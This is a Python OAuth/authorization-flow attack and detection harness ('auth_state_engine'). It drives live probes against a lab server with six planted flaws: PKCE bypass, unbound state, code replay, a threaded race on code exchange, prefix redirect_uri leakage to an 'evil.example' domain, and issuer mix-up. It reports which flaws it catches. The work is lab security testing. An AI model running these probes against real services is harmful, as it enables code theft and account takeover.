#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
auth_state_engine v1.0.0 — companion executable to dossier_3_auth_state_machines.md
VOIDFORGE / Offensive Security Research Division — research artifact, LAB USE ONLY.

v1 upgrade over v0.1.0 (honest delta):
  (a) LIVE instrumentation  — LabDriver (stdlib http.client) drives a real target;
                              traces are captured, not annotated by hand.
  (b) machine inference     — prefix-tree (Mealy) inference over the LIVE traces;
                              compared against the IDEAL flow machine (specified).
                              L*/Angluin active learning stays v2 (à confirmer).
  (c) property monitors     — no_skip / no_replay / binding / entropy — same
                              architecture as v0, now fed by live traces.
  (d) token algebra         — binding τ extraction from observed tokens (JWT audit
                              preserved for JWT targets; opaque tokens handled via
                              observed issuer/audience echoes).
  (e) race harness          — EXECUTED (threads) against single-use endpoints,
                              not plan-only; single-packet HTTP/2 stays delegated.
  (f) verdict()             — JSON contract: tool, exploitable True|False|"partial",
                              summary, evidence. Plus per-flaw acceptance report.

Usage:
    python auth_state_engine.py --demo
    python auth_state_engine.py --live --target http://127.0.0.1:9443 \
        --report lab_acceptance_report.md --json lab_verdict.json
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import http.client
import json
import math
import sys
import threading
import time
import urllib.parse
from collections import Counter
from dataclasses import dataclass, field
from typing import Any

ENGINE = "auth_state_engine"
VERSION = "1.0.0"

MIN_CODE_BITS = 160.0     # authorization code floor (dossier §2.3 P6 / §6.1)
MIN_STATE_BITS = 128.0    # state/CSRF floor

# ===========================================================================
# §2.2 — token binding τ = (subject, scope, epoch, audience, issuer)
# ===========================================================================

@dataclass
class Binding:
    subject: str | None = None
    scope: frozenset[str] = frozenset()
    epoch: int | None = None
    audience: frozenset[str] = frozenset()
    issuer: str | None = None
    raw: dict[str, Any] = field(default_factory=dict)


# ===========================================================================
# Trace model (v0-compatible) + HTTP exchange capture
# ===========================================================================

@dataclass
class TraceEvent:
    event: str                     # symbolic input: "authorize", "callback",
                                   # "code_consume", "token_present", ...
    actor: str = "victim"          # session matrix: victim / attacker
    params: dict[str, Any] = field(default_factory=dict)
    state: str | None = None       # observed machine state marker
    outcome: str = "200"
    ts: float = field(default_factory=time.time)
    evidence: dict[str, Any] = field(default_factory=dict)  # exact HTTP PoC


@dataclass
class Trace:
    trace_id: str
    events: list[TraceEvent]


@dataclass
class HttpExchange:
    method: str
    path: str
    status: int
    location: str | None = None
    body: dict[str, Any] = field(default_factory=dict)

    def poc(self) -> dict[str, Any]:
        return {"request": f"{self.method} {self.path}",
                "status": self.status,
                "location": self.location,
                "body": self.body}


def _accepted(outcome: str) -> bool:
    """2xx or 3xx = flow-level success (a 302 callback redirect is a success)."""
    return outcome.startswith(("2", "3"))


# Garde d'encodage (revue de code finale) : les symboles LTL (□, ◇, τ) des
# findings plantent sur les consoles Windows héritées (cp1252/cp850) — v0
# avait ce reconfigure, v1 l'avait perdu ; restauré au niveau module pour
# couvrir tous les points d'entrée.
if sys.stdout is not None and hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


# ===========================================================================
# (a) LIVE driver — stdlib http.client, no auto-redirect (we WANT the 302)
# ===========================================================================

class LabDriver:
    def __init__(self, host: str, port: int, timeout: float = 10.0):
        self.host, self.port, self.timeout = host, port, timeout

    def _conn(self) -> http.client.HTTPConnection:
        return http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)

    def request(self, method: str, path: str, headers: dict[str, str] | None = None
                ) -> HttpExchange:
        conn = self._conn()
        try:
            conn.request(method, path, headers=headers or {})
            resp = conn.getresponse()
            raw = resp.read()
            loc = resp.getheader("Location")
            try:
                body = json.loads(raw.decode("utf-8")) if raw else {}
                if not isinstance(body, dict):
                    body = {"raw": body}
            except Exception:
                body = {"raw": raw[:200].decode("utf-8", "replace")} if raw else {}
            return HttpExchange(method, path, resp.status, loc, body)
        finally:
            conn.close()

    def health(self) -> bool:
        try:
            return self.request("GET", "/health").status == 200
        except OSError:
            return False

    # -- flow steps ---------------------------------------------------------

    def authorize(self, issuer: str, login: str, redirect_uri: str, state: str,
                  extra: dict[str, str] | None = None) -> tuple[HttpExchange, str | None, str | None]:
        """GET /auth{A|B}/authorize?... → (exchange, code, state_echoed)."""
        q = {"login": login, "redirect_uri": redirect_uri, "state": state}
        if extra:
            q.update(extra)
        path = f"/auth{issuer}/authorize?" + urllib.parse.urlencode(q)
        ex = self.request("GET", path)
        code = state_e = None
        if ex.location:
            qs = urllib.parse.parse_qs(urllib.parse.urlparse(ex.location).query)
            code = qs.get("code", [None])[0]
            state_e = qs.get("state", [None])[0]
        return ex, code, state_e

    def exchange(self, code: str, verifier: str | None = None) -> tuple[HttpExchange, dict[str, Any]]:
        """POST /token?code=... [&code_verifier=...] → (exchange, token_json).
        Flow adaptation: if the target answers 501 (method unsupported — the
        lab implements do_GET only), retry with GET; the method actually used
        stays visible in the PoC evidence."""
        path = f"/token?code={urllib.parse.quote(code)}"
        if verifier is not None:
            path += "&code_verifier=" + urllib.parse.quote(verifier)
        ex = self.request("POST", path, headers={"Content-Length": "0"})
        if ex.status == 501:
            ex = self.request("GET", path)
        return ex, ex.body

    def api_user(self, token: str) -> HttpExchange:
        return self.request("GET", "/api/user",
                            headers={"Authorization": f"Bearer {token}"})


# ===========================================================================
# (b) machine inference — prefix-tree (Mealy) over LIVE symbolic traces
# ===========================================================================

class PrefixTreeMachine:
    """Light inference: states = prefixes of symbolic events (depth-capped),
    edges = observed (event, outcome-class). Honest scope: this is a prefix
    tree, NOT L*; it still suffices to compare against the IDEAL machine for
    transition-gap findings (dossier §5.2 — L*/AALpy active learning = v2)."""

    def __init__(self, max_depth: int = 3):
        self.max_depth = max_depth
        self.edges: Counter = Counter()          # (prefix, event, ok) -> count

    def learn(self, traces: list[Trace]) -> None:
        for t in traces:
            prefix: tuple[str, ...] = ()
            for ev in t.events:
                ok = _accepted(ev.outcome)
                self.edges[(prefix, ev.event, ok)] += 1
                prefix = (prefix + (ev.event,))[-self.max_depth:]

    def has_edge(self, prefix: tuple[str, ...], event: str, ok: bool = True) -> bool:
        return self.edges.get((prefix, event, ok), 0) > 0

    def summary(self) -> dict[str, Any]:
        states = {p for (p, _, _) in self.edges} | {p + (e,)
                  for (p, e, _) in self.edges}
        return {"inference": "prefix_tree (live traces)",
                "states": len(states),
                "edges": sum(self.edges.values()),
                "alphabet": sorted({e for (_, e, _) in self.edges})}


# The IDEAL flow machine (specified, dossier §2): every one of these
# transitions MUST be observable; their absence where the flow succeeds is a
# machine-gap = bug.
IDEAL_REQUIRED_EDGES = [
    (("authorize",), "state_verify"),     # callback state must be verified
]


# ===========================================================================
# (c) property monitors — v0 architecture, live traces
# ===========================================================================

class NoSkipMonitor:
    """P1 □(enter(s_protected) → ◇proof(n) ∧ fresh(proof(n)))
    Two live checks: (1) exchange reached with NO proof transition anywhere in
    the session trace; (2) protected transition without required proofs.
    Revue de code : le check (1) n'est plus codé en dur sur "state_verify" —
    il dérive de proof_events ; et quand une machine inférée est fournie, les
    IDEAL_REQUIRED_EDGES sont consultées par diff formel (arête idéale absente
    de la machine observée = gap structurel), le chemin propre demandé."""

    def __init__(self, required_proofs: dict[str, set[str]], proof_events: set[str],
                 machine: "PrefixTreeMachine | None" = None):
        self.required = required_proofs
        self.proof_events = proof_events
        self.machine = machine

    def run(self, trace: Trace) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        acquired: set[str] = set()
        events = [e.event for e in trace.events]
        for ev in trace.events:
            if ev.event in self.proof_events and _accepted(ev.outcome):
                acquired.add(ev.event)
            if ev.event == "code_consume" and _accepted(ev.outcome):
                gap = self._structural_gap(events)
                if gap:
                    findings.append({
                        "template": "no_skip",
                        "property": "□(code_consume → ◇state_verify)",
                        "trace": trace.trace_id,
                        "evidence": {
                            "gap": gap,
                            "observed_sequence": events,
                        }})
            if ev.state in self.required:
                missing = self.required[ev.state] - acquired
                if missing and _accepted(ev.outcome):
                    findings.append({
                        "template": "no_skip",
                        "property": "□(enter(s_protected) → ◇proof(n) ∧ fresh(proof(n)))",
                        "trace": trace.trace_id,
                        "evidence": {"entered_state": ev.state,
                                     "missing_proofs": sorted(missing)}})
        return findings

    def _structural_gap(self, events: list[str]) -> str | None:
        """Formal path first: diff the observed machine against
        IDEAL_REQUIRED_EDGES; without a machine, fall back to the trace-level
        check over self.proof_events (plus aucun nom codé en dur)."""
        if self.machine is not None:
            missing = [f"{list(p)} --{e}--> ? (ideal edge absent from observed machine)"
                       for (p, e) in IDEAL_REQUIRED_EDGES
                       if not self.machine.has_edge(p, e)]
            if missing:
                return "machine-gap vs IDEAL_REQUIRED_EDGES: " + "; ".join(missing)
            return None  # ideal edges present → pas de gap structurel
        return None if (set(events) & self.proof_events) else (
            "code exchanged with NO proof transition anywhere in the observed trace "
            f"(required proof events: {sorted(self.proof_events)})")


class NoReplayMonitor:
    """P2 □(consume(c) → X□¬consume(c)) — duplicate successful consumption."""

    SINGLE_USE_EVENTS = {"code_consume"}

    def run(self, trace: Trace) -> list[dict[str, Any]]:
        findings = []
        consumed: Counter = Counter()
        for ev in trace.events:
            if ev.event in self.SINGLE_USE_EVENTS and _accepted(ev.outcome):
                consumed[str(ev.params.get("token_id", "?"))] += 1
        for tid, n in consumed.items():
            if n > 1:
                findings.append({
                    "template": "no_replay",
                    "property": "□(consume(c) → X□¬consume(c))",
                    "trace": trace.trace_id,
                    "evidence": {"event": "code_consume", "token_id": tid,
                                 "successful_consumes": n},
                    "impact": "non-atomic single-use guard — race window "
                              "(dossier §6.5: P = 1−(1−p)^k)"})
        return findings


class MixupMonitor:
    """P4 issuer confinement: □(token_use(u,τ) → τ.iss ∈ trusted ∧ τ.iss = iss(route))."""

    def __init__(self, trusted_issuers: set[str], expected_rs_issuers: dict[str, set[str]]):
        self.trusted = trusted_issuers
        self.rs_expected = expected_rs_issuers    # route -> allowed issuers

    def run(self, trace: Trace) -> list[dict[str, Any]]:
        findings = []
        for ev in trace.events:
            if ev.event == "token_present" and _accepted(ev.outcome):
                route = str(ev.params.get("route", "/api/user"))
                iss = ev.params.get("iss")
                allowed = self.rs_expected.get(route)
                if allowed is not None and iss is not None and iss not in allowed:
                    findings.append({
                        "template": "issuer_confinement",
                        "property": "□(token_use(u,τ) → τ.iss ∈ allowed(route))",
                        "trace": trace.trace_id,
                        "evidence": {"route": route, "token_iss": iss,
                                     "allowed": sorted(allowed),
                                     "rs_note": ev.params.get("rs_note")},
                        "verdict": "FOREIGN_ISSUER_TOKEN_ACCEPTED"})
        return findings


class BindingMonitor:
    """P3 binding preservation: a code must be redeemable only WITH its proof of
    possession (PKCE), and tokens must stay inside their bound audience/issuer."""

    def run_pkce(self, trace: Trace) -> list[dict[str, Any]]:
        findings = []
        for ev in trace.events:
            if ev.event == "code_consume" and _accepted(ev.outcome) \
                    and ev.params.get("verifier_sent") is False:
                findings.append({
                    "template": "binding_preservation",
                    "property": "□(grant(code) → ∃verifier: "
                                "SHA256(verifier)=challenge ∧ code↔challenge bound)",
                    "trace": trace.trace_id,
                    "evidence": {"verifier_sent": False,
                                 "note": "code redeemed with NO proof of possession",
                                 "poc": ev.evidence}})
        return findings

    def run_audience(self, trace: Trace) -> list[dict[str, Any]]:
        findings = []
        for ev in trace.events:
            if ev.event == "token_present" and _accepted(ev.outcome):
                aud = ev.params.get("aud") or set()
                want = ev.params.get("endpoint_aud")
                if want and want not in aud:
                    findings.append({
                        "template": "binding_preservation",
                        "property": "□(grant(B) → τ.aud ∋ res ∧ τ.iss = iss(res))",
                        "trace": trace.trace_id,
                        "evidence": {"token_iss": ev.params.get("iss"),
                                     "token_aud": sorted(aud),
                                     "endpoint_aud": want,
                                     "poc": ev.evidence}})
        return findings


# ===========================================================================
# (d) token algebra — entropy floor (H = L·log2|C|, dossier §6.1)
# ===========================================================================

def charset_of(secret: str) -> tuple[str, int, bool]:
    """Classifie l'espace de symboles d'un secret.

    BUGFIX entropie (hérité de v0, documenté par l'audit final) : l'ancienne
    version comptait set("0-9a-fA-F") = 22 symboles pour TOUT code hex, ce qui
    gonflait H de 32.0 → 35.7 bits sur 8 caractères. La vérité :
      - hex tout-minuscule ou tout-majuscule = 16 VALEURS canoniques ;
      - hex à casse mélangée = réellement 22 symboles (0-9, a-f, A-F).
    En cas d'ambiguïté (échantillon trop court pour départager hex/22 et
    base62/62), on classe au plus petit espace — surestimer l'entropie ferait
    rater un entropy-floor FAIL, c'est le sens non-safe qui est interdit.
    """
    HEX = set("0123456789abcdef")
    HEX_MIXED = set("0123456789abcdefABCDEF")
    observed = set(secret)
    if not observed:
        # garde d'audit (revue de code finale) : l'ensemble vide est sous-ensemble
        # de tout — sans ce garde, un secret vide serait classé "digits" et la
        # valeur nominale serait faussement bien définie au lieu d'inconclusive
        return "empty", 0, False
    if observed <= set("0123456789"):
        return "digits", 10, True
    if set(secret.lower()) <= HEX and observed <= HEX_MIXED:
        mixed = any(c.isupper() for c in secret) and any(c.islower() for c in secret)
        return "hex", (22 if mixed else 16), True
    if observed <= set("0123456789abcdefghijklmnopqrstuvwxyz"):
        return "base36", 36, True
    if observed <= set("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"):
        return "base62", 62, True
    if observed <= set("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"):
        return "base64url", 64, True
    return "unknown", len(observed), False


def shannon_bits(sample: str) -> float:
    if not sample:
        return 0.0
    counts = Counter(sample)
    n = len(sample)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def check_entropy(secret: str, label: str, min_bits: float) -> dict[str, Any]:
    name, size, confident = charset_of(secret)
    nominal = len(secret) * math.log2(size) if confident else float("nan")
    return {"label": label,
            "charset": name, "length": len(secret),
            "nominal_bits": round(nominal, 1) if confident else None,
            "empirical_bits_sample": round(shannon_bits(secret), 1),
            "min_bits": min_bits,
            "verdict": "PASS" if confident and nominal >= min_bits else "FAIL",
            "method": "H = L·log2|C|"}


# ===========================================================================
# (e) race harness — EXECUTED (threads) against a single-use endpoint
# ===========================================================================

def race_exchange(driver: LabDriver, code: str, n_threads: int = 16
                  ) -> dict[str, Any]:
    results: list[tuple[int, dict[str, Any] | None]] = []
    lock = threading.Lock()
    barrier = threading.Barrier(n_threads)

    def worker() -> None:
        barrier.wait()                      # maximize simultaneity (sync point)
        ex, body = driver.exchange(code)
        with lock:
            results.append((ex.status, body))

    threads = [threading.Thread(target=worker) for _ in range(n_threads)]
    t0 = time.time()
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    window_ms = (time.time() - t0) * 1000.0
    ok = sum(1 for s, _ in results if s == 200)
    tokens = {json.dumps(b, sort_keys=True) for _, b in results if b}
    return {"mode": "executed_threads",
            "threads": n_threads, "success_2xx": ok,
            "distinct_tokens": len(tokens),
            "wall_ms": round(window_ms, 1),
            "model": "P = 1−(1−p)^k per attempt (dossier §6.5)",
            "interpretation": ("single-use guard ABSENT — open door, not a window"
                               if ok > 1 else
                               "atomic within measured window (this run)"),
            "bodies_sample": [b for _, b in results if b][:2]}


# ===========================================================================
# (f) verdict — JSON contract (dossier §5.4)
# ===========================================================================

SEVERITY = {"no_skip": "critical", "no_replay": "high",
            "issuer_confinement": "critical", "binding_preservation": "high",
            "entropy_floor": "high", "redirect_validation": "high"}

TITLES = {
    "no_skip": "Protected transition reachable without required proof (step-skip)",
    "no_replay": "Single-use token consumed more than once (non-atomic guard)",
    "issuer_confinement": "Token accepted outside its bound issuer (mix-up surface)",
    "binding_preservation": "Grant accepted without its proof of possession / outside its audience",
    "entropy_floor": "Token below the entropy floor (H = L·log2|C| < min)",
    "redirect_validation": "redirect_uri validated by prefix — code leakage path",
}

FLAW_TEMPLATES = {   # planted flaw -> finding templates that catch it
    "D1": ["binding_preservation"],
    "D2": ["no_skip"],
    "D3": ["no_replay"],
    "D4": ["redirect_validation"],
    "D5": ["entropy_floor"],
    "D6": ["issuer_confinement", "binding_preservation"],
}


class VerdictBuilder:
    def __init__(self, target: dict[str, Any]):
        self.target = target
        self.findings: list[dict[str, Any]] = []
        self._seq = 0
        self.n_primary: int | None = None  # rempli par finalize()

    def add(self, template: str, finding: dict[str, Any]) -> dict[str, Any]:
        self._seq += 1
        rec = {"id": f"VF-AUTH-{self._seq:03d}",
               "severity": SEVERITY.get(template, "info"),
               "title": TITLES.get(template, template),
               # template stocké dans le record (revue de code : finalize()
               # groupe par (flaw, template) — sans ce champ, sondes et
               # monitor-pass ne fusionnaient jamais)
               "template": template,
               **finding}
        self.findings.append(rec)
        return rec

    def exploitable(self) -> Any:
        """True|False|"partial" — honest contract: True only with a live,
        reproduced critical/high finding; False with nothing; 'partial' when
        primitives exist but a full chain was not demonstrated."""
        strong = [f for f in self.findings
                  if f.get("severity") in ("critical", "high")]
        if not strong:
            return False
        return True if any(f.get("reproduced") for f in strong) else "partial"

    def finalize(self) -> None:
        """Déduplication honnête (revue de code) : les findings partageant
        (flaw, template) — sonde directe + monitor-pass qui se corroborent —
        gardent le premier reproduit comme primary ; les autres pointent vers
        lui via "dedup". Rien n'est supprimé : l'évidence complète reste dans
        le JSON, seule la lecture est clarifiée."""
        groups: dict[tuple[str, str], list[dict[str, Any]]] = {}
        for f in self.findings:
            key = (str(f.get("flaw", "?")).split("(")[0],
                   str(f.get("template", f.get("title", "?"))))
            groups.setdefault(key, []).append(f)
        for group in groups.values():
            primary = next((f for f in group if f.get("reproduced")), group[0])
            for f in group:
                if f is primary:
                    f["dedup"] = {"role": "primary"}
                else:
                    f["dedup"] = {"role": "corroboration", "of": primary["id"]}
        self.n_primary = sum(1 for f in self.findings
                             if f.get("dedup", {}).get("role") == "primary")

    def to_json(self, machine: dict[str, Any], entropy: list[dict[str, Any]],
                race: dict[str, Any]) -> str:
        n_primary = self.n_primary if self.n_primary is not None else len(self.findings)
        return json.dumps({
            "tool": ENGINE, "version": VERSION,
            "target": self.target,
            "exploitable": self.exploitable(),
            "summary": (f"{n_primary} primary finding(s) "
                        f"(+{len(self.findings) - n_primary} corroboration) — "
                        f"{len([f for f in self.findings if f.get('reproduced')])} "
                        f"reproduced live"),
            "machine": machine,
            "findings": self.findings,
            "entropy": entropy,
            "race": race,
        }, indent=2, ensure_ascii=False, default=str)


# ===========================================================================
# LIVE probes — one per planted flaw D1..D6 (+ race). Each probe returns
# TraceEvents for the monitors AND its own direct check. Nothing is asserted:
# every CAUGHT/MISSSED is decided by observed HTTP behavior.
# ===========================================================================

APP_CB = "https://app.example/cb"
ISSUERS = {"A": "https://issuer-a.example", "B": "https://issuer-b.example"}


class LiveRunner:
    def __init__(self, driver: LabDriver, target_info: dict[str, Any] | None = None):
        self.d = driver
        self.traces: list[Trace] = []
        self.findings: list[dict[str, Any]] = []
        # le contrat verdict() transporte l'identité de la cible (revue de code :
        # "target": {} vide ne prouvait même pas SUR QUOI le run a tourné)
        self.vb = VerdictBuilder(target=target_info or {})

    def _trace(self, tid: str, events: list[TraceEvent]) -> Trace:
        t = Trace(tid, events)
        self.traces.append(t)
        return t

    def _add(self, template: str, flaw: str, reproduced: bool,
             evidence: dict[str, Any]) -> dict[str, Any]:
        return self.vb.add(template, {
            "flaw": flaw, "reproduced": reproduced, "evidence": evidence})

    # -- D1: PKCE never required (binding) ----------------------------------

    def probe_d1(self) -> dict[str, Any]:
        challenge = base64.urlsafe_b64encode(
            hashlib.sha256(b"engine-verifier-7f3a").digest()).decode().rstrip("=")
        ex, code, _ = self.d.authorize(
            "A", "victime", APP_CB, "s-v1",
            extra={"code_challenge": challenge, "code_challenge_method": "S256"})
        # exchange WITHOUT any code_verifier → binding violation if 200
        ex2, tok = self.d.exchange(code) if code else (None, {})
        ev = TraceEvent("code_consume", "attacker",
                        {"token_id": code, "verifier_sent": False,
                         "challenge_sent": True},
                        "s_token", str(ex2.status if ex2 else "ERR"),
                        evidence={"authorize": ex.poc(), "exchange": ex2.poc() if ex2 else None})
        self._trace("d1-pkce-binding", [ev])
        caught = bool(ex2 and ex2.status == 200 and tok.get("access_token"))
        f = self._add("binding_preservation", "D1", caught, {
            "claim": "code redeemable with code_verifier ABSENT although "
                     "code_challenge was sent at authorize",
            "authorize": ex.poc(), "exchange": ex2.poc() if ex2 else None,
            "token_issued": bool(tok.get("access_token"))})
        return {"flaw": "D1", "caught": caught, "monitor": "BindingMonitor.run_pkce",
                "finding": f}

    # -- D2: state accepted, never bound to a session (no-binding + no-skip) --

    def probe_d2(self) -> dict[str, Any]:
        UNBOUND = "ATTACKER-STATE-NEVER-MINTED-9f27"
        ex, code, echoed = self.d.authorize("A", "victime", APP_CB, UNBOUND)
        # session trace: authorize → callback → exchange, NO state_verify ever
        evs = [
            TraceEvent("authorize", "victim", {"state": UNBOUND},
                       "s0", str(ex.status), evidence=ex.poc()),
        ]
        if code:
            ex2, tok = self.d.exchange(code)
            evs.append(TraceEvent("code_consume", "victim",
                                  {"token_id": code, "verifier_sent": False},
                                  "s_token", str(ex2.status),
                                  evidence=ex2.poc()))
        self._trace("d2-state-unbound", evs)
        unbound_accepted = bool(ex.status in (200, 302) and code is not None
                                and echoed == UNBOUND)
        caught = unbound_accepted
        f = self._add("no_skip", "D2", caught, {
            "claim": "server issues code and echoes an attacker-chosen state "
                     "without ANY session binding; machine has no "
                     "state_verify transition (no-skip P1 gap)",
            "authorize": ex.poc(), "state_echoed": echoed,
            "unbound_state_accepted": unbound_accepted})
        return {"flaw": "D2", "caught": caught,
                "monitor": "NoSkipMonitor + BindingMonitor (state)",
                "finding": f}

    # -- D3: reusable authorization code (no-replay) -------------------------

    def probe_d3(self) -> dict[str, Any]:
        ex, code, _ = self.d.authorize("A", "victime", APP_CB, "s-v3")
        evs = []
        consumes = []
        for i in range(2):
            ex2, tok = self.d.exchange(code)
            consumes.append((ex2.status, tok))
            evs.append(TraceEvent("code_consume", "victim" if i == 0 else "attacker",
                                  {"token_id": code}, "s_token", str(ex2.status),
                                  evidence=ex2.poc()))
        self._trace("d3-code-replay", evs)
        t1, t2 = (tok.get("access_token") for _, tok in consumes)
        caught = all(s == 200 for s, _ in consumes) and t1 and t2 and t1 != t2
        f = self._add("no_replay", "D3", caught, {
            "claim": "same code exchanged twice → two distinct tokens",
            "exchange_1": consumes[0][0], "exchange_2": consumes[1][0],
            "distinct_tokens": bool(t1 and t2 and t1 != t2),
            "token1_prefix": (t1 or "")[:16], "token2_prefix": (t2 or "")[:16]})
        return {"flaw": "D3", "caught": caught, "monitor": "NoReplayMonitor",
                "finding": f}

    # -- D4: redirect_uri validated by PREFIX --------------------------------

    def probe_d4(self) -> dict[str, Any]:
        EVIL = "https://app.example/cb.evil.example"
        ex, code, _ = self.d.authorize("A", "victime", EVIL, "s-v4")
        caught = bool(ex.status == 302 and code and ex.location
                      and EVIL in ex.location)
        ev = TraceEvent("authorize", "attacker", {"redirect_uri": EVIL},
                        "s0", str(ex.status), evidence=ex.poc())
        self._trace("d4-redirect-prefix", [ev])
        f = self._add("redirect_validation", "D4", caught, {
            "claim": "prefix validation accepted evil sibling domain — "
                     "code + state leak to attacker-controlled origin",
            "authorize": ex.poc(),
            "leaked_code_prefix": (code or "")[:8],
            "location": ex.location})
        return {"flaw": "D4", "caught": caught,
                "monitor": "redirect_validation probe", "finding": f}

    # -- D5: 32-bit code (entropy floor) --------------------------------------

    def probe_d5(self, samples: int = 100) -> dict[str, Any]:
        codes: list[str] = []
        for i in range(samples):
            _, code, _ = self.d.authorize("A", f"ent-{i}", APP_CB, f"s-e{i}")
            if code:
                codes.append(code)
        joined = "".join(codes)
        rep = check_entropy(codes[0] if codes else "", "authorization code", MIN_CODE_BITS) \
            if codes else {"verdict": "NO_DATA"}
        # rigueur d'échantillon (revue de code) : la valeur nominale H = L·log2|C|
        # est par-code, mais le POOL entier doit corroborer — Shannon empirique
        # sur l'échantillon joint, ramené par code (joined n'est plus mort)
        if codes and isinstance(rep.get("nominal_bits"), (int, float)):
            h_sym = shannon_bits(joined)
            rep["empirical_pool_bits_per_code"] = round(
                h_sym * len(codes[0]), 2)
        distinct = len(set(codes))
        caught = bool(codes) and rep.get("verdict") == "FAIL"
        ev = TraceEvent("authorize", "victim", {"n": samples}, "s0", "302",
                        evidence={"codes_collected": len(codes),
                                  "sample_codes": codes[:5]})
        self._trace("d5-entropy", [ev])
        f = self._add("entropy_floor", "D5", caught, {
            "claim": f"H = L·log2|C| = {rep.get('nominal_bits')} bits "
                     f"(< {MIN_CODE_BITS:.0f}) on {len(codes)} live codes"
                     + (f" — pool Shannon {rep['empirical_pool_bits_per_code']} "
                        f"bits/code" if "empirical_pool_bits_per_code" in rep else ""),
            "entropy_report": rep,
            "distinct_of_sample": f"{distinct}/{len(codes)}",
            "sample_codes": codes[:5]})
        return {"flaw": "D5", "caught": caught, "monitor": "EntropyMonitor",
                "finding": f}

    # -- D6: RS checks neither iss nor aud (mix-up / audience confusion) ------

    def probe_d6(self) -> dict[str, Any]:
        ex, code_b, _ = self.d.authorize("B", "victime", APP_CB, "s-v6")
        ex2, tok = self.d.exchange(code_b) if code_b else (None, {})
        token = tok.get("access_token") if tok else None
        observed_iss = tok.get("iss") if tok else None
        ex3 = self.d.api_user(token) if token else None
        evs = [
            TraceEvent("authorize", "attacker", {"issuer": "B"}, "s0",
                       str(ex.status), evidence=ex.poc()),
        ]
        if ex2:
            evs.append(TraceEvent("code_consume", "attacker",
                                  {"token_id": code_b, "verifier_sent": False},
                                  "s_token", str(ex2.status), evidence=ex2.poc()))
        if ex3:
            evs.append(TraceEvent("token_present", "attacker",
                                  {"route": "/api/user", "iss": observed_iss,
                                   "aud": {"app.example"},
                                   "endpoint_aud": "app.example",
                                   "endpoint_iss": ISSUERS["A"],
                                   "rs_note": ex3.body.get("note")},
                                  "s_resource", str(ex3.status),
                                  evidence=ex3.poc()))
        self._trace("d6-mixup-audience", evs)
        caught = bool(ex3 and ex3.status == 200
                      and observed_iss == ISSUERS["B"])
        f = self._add("issuer_confinement", "D6", caught, {
            "claim": "token issued by issuer-B accepted by the resource server "
                     "of issuer-A (no iss/aud enforcement — mix-up surface)",
            "authorize_issuer_b": ex.poc(),
            "token_iss": observed_iss,
            "rs_exchange": ex3.poc() if ex3 else None,
            "rs_note": ex3.body.get("note") if ex3 else None})
        # audience/issuer binding side-finding for the same evidence
        if caught:
            self._add("binding_preservation", "D6", True, {
                "claim": "binding preservation violated: τ.iss ∉ allowed(RS)",
                "token_iss": observed_iss, "allowed": [ISSUERS["A"]],
                "poc": ex3.poc() if ex3 else None})
        return {"flaw": "D6", "caught": caught,
                "monitor": "MixupMonitor + BindingMonitor.run_audience",
                "finding": f}

    # -- race harness on the single-use endpoint ------------------------------

    def probe_race(self) -> dict[str, Any]:
        _, code, _ = self.d.authorize("A", "victime", APP_CB, "s-race")
        race = race_exchange(self.d, code, n_threads=16)
        ev = TraceEvent("code_consume", "attacker", {"token_id": code,
                                                     "race": race["threads"]},
                        "s_token", "200" if race["success_2xx"] else "ERR",
                        evidence={"race": {k: race[k] for k in
                                           ("threads", "success_2xx", "wall_ms")}})
        self._trace("race-code", [ev])
        caught = race["success_2xx"] > 1
        f = self._add("no_replay", "D3-race", caught, {
            "claim": "concurrent exchanges of ONE code all succeeded",
            "race": race})
        return {"flaw": "D3-race", "caught": caught,
                "monitor": "race harness (executed)", "finding": f}


# ===========================================================================
# acceptance report (markdown) — per-flaw CAUGHT / MISSED + PoC evidence
# ===========================================================================

def write_report(path: str, target: str, results: list[dict[str, Any]],
                 machine: dict[str, Any], race: dict[str, Any],
                 verdict_json: str) -> None:
    L: list[str] = []
    L.append("# LAB ACCEPTANCE REPORT — auth_state_engine v1.0.0\n")
    L.append(f"*Cible : `{target}` — run du {time.strftime('%Y-%m-%d %H:%M:%S')}.*\n")
    L.append("*Chaque verdict CAUGHT/MISSED est décidé par le comportement HTTP "
             "observé — rien n'est affirmé sans PoC rejouable.*\n")
    caught_n = sum(1 for r in results if r["caught"])
    L.append(f"\n**Score : {caught_n}/{len(results)} défauts détectés.**\n")
    L.append("\n| Défaut | Verdict | Moniteur | Finding |\n|---|---|---|---|")
    for r in results:
        fid = (r.get("finding") or {}).get("id", "—")
        L.append(f"| {r['flaw']} | {'CAUGHT ✅' if r['caught'] else 'MISSED ❌'} "
                 f"| {r['monitor']} | {fid} |")

    L.append("\n## Détail par défaut\n")
    for r in results:
        v = "CAUGHT ✅" if r["caught"] else "MISSED ❌"
        L.append(f"### {r['flaw']} — {v}\n")
        L.append(f"- **Moniteur** : {r['monitor']}")
        f = r.get("finding") or {}
        L.append(f"- **Finding** : {f.get('id', '—')} "
                 f"(severity: {f.get('severity', '—')})")
        ev = f.get("evidence", {})
        if f.get("reproduced"):
            L.append(f"- **Claim** : {ev.get('claim', '')}")
        for key in ("authorize", "exchange", "exchange_1", "exchange_2",
                    "rs_exchange", "race", "entropy_report", "location",
                    "token_iss", "state_echoed", "unbound_state_accepted",
                    "distinct_tokens", "distinct_of_sample", "token1_prefix",
                    "token2_prefix", "leaked_code_prefix", "sample_codes"):
            if key in ev and ev[key] is not None:
                L.append(f"- **{key}** : `{json.dumps(ev[key], ensure_ascii=False, default=str)}`")
        if ev.get("claim"):
            L.append(f"- **Claim** : {ev['claim']}")
        L.append("")

    L.append("## Machine inférée (traces live)\n")
    L.append(f"- méthode : {machine['inference']}")
    L.append(f"- états : {machine['states']} — arêtes : {machine['edges']}")
    L.append(f"- alphabet : {machine['alphabet']}")
    L.append("\n## Race harness (exécuté)\n")
    L.append("```json\n" + json.dumps(race, indent=2, default=str) + "\n```")
    L.append("\n## verdict() — contrat JSON\n")
    L.append("```json\n" + verdict_json + "\n```")
